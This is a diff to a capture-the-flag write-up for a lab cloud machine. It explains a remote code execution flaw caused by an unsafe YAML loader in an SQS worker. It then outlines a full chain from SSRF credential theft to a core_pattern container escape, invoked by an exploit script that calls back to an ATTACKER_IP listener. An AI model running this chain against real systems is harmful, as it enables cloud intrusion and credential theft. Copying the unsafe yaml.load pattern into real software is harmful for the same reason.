@@ -140,4 +140,101 @@ cat /home/worker/user.txt
 
 At this stage the initial foothold on the machine had been successfully established.
 
-> **Note:** Continue with privilege escalation once additional enumeration identifies a path to the underlying host or elevated privileges.
+## Process Enumeration
+
+Although the automation successfully compromised the machine, I continued enumerating the worker container to better understand the application's architecture and validate the assumptions made during exploitation.
+
+Listing the running processes showed the services executing inside the container.
+
+```bash
+ps aux
+```
+
+The output confirmed that the container's primary process was:
+
+```text
+python3 -u worker.py
+```
+
+This indicated that a dedicated Python worker continuously processed queued jobs. The remaining `python3 -c...` processes corresponded to the reverse shell established during exploitation, confirming that the payload had been executed by the worker service rather than another component of the application.
+
+> **Insert screenshot:** Process list
+
+## Application Enumeration
+
+Having identified `worker.py` as the container's primary process, the next step was to inspect the application itself.
+
+Navigating to the application directory revealed a minimal codebase.
+
+```bash
+cd /app
+ls -la
+```
+
+Only two files were present:
+
+- `worker.py`
+- `requirements.txt`
+
+Since the entire application logic appeared to reside within a single Python script, reviewing its source code became the natural next step in understanding how jobs were processed and ultimately why remote code execution was possible.
+
+> **Insert screenshot:** `/app` directory
+
+## Source Code Review
+
+Reviewing the source code of `worker.py` confirmed the assumptions made during exploitation.
+
+```bash
+cat worker.py
+```
+
+The worker continuously polled the `nimbus-jobs` SQS queue, parsed incoming YAML messages using:
+
+```python
+yaml.load(..., Loader=yaml.Loader)
+```
+
+and executed the contents of the `script` field by passing it directly to:
+
+```python
+python3 -c
+```
+
+Using `yaml.load()` with untrusted input performs unsafe object deserialization, allowing arbitrary Python objects to be instantiated during parsing. This design flaw explains why the malicious YAML payload successfully achieved arbitrary code execution and confirms the root cause of the compromise.
+
+> **Insert screenshot:** Vulnerable code
+
+To better understand the application's runtime behaviour, I manually executed the worker process and observed how it handled queued messages.
+
+```bash
+python3 worker.py
+```
+
+The worker immediately began polling the `nimbus-jobs` queue.
+
+This confirmed that the worker continuously trusted and executed user-controlled job definitions retrieved from the SQS queue. Together with the unsafe use of `yaml.load()`, this behaviour fully explained why arbitrary Python code could be executed simply by submitting a crafted YAML document.
+
+> **Insert screenshot:** Worker processing queue
+
+## Privilege Escalation
+
+After validating the worker's behaviour and understanding the application's architecture, I used a custom automation script to reproduce the complete attack chain.
+
+The script requires only the attacker's callback IP address and automatically performs the remaining stages of the exploitation process:
+
+```bash
+python3 nimbus_exploit.py <ATTACKER_IP> --port <LOCAL_PORT> --target <TARGET_IP>
+```
+
+- Retrieves fresh IAM credentials through the SSRF vulnerability.
+- Authenticates to the LocalStack AWS environment.
+- Generates a malicious YAML payload.
+- Submits the payload to the `nimbus-jobs` SQS queue.
+- Starts an HTTP callback listener.
+- Triggers a privileged CodeBuild container.
+- Exploits the host's `core_pattern` mechanism.
+- Retrieves both the user and root flags.
+
+Within a few seconds, the worker processed the queued payload, the privileged build completed successfully, and the callback listener received the contents of both `user.txt` and `root.txt`, demonstrating a fully automated compromise from initial SSRF to root access.
+
+> **Insert screenshot:** Successful exploit output
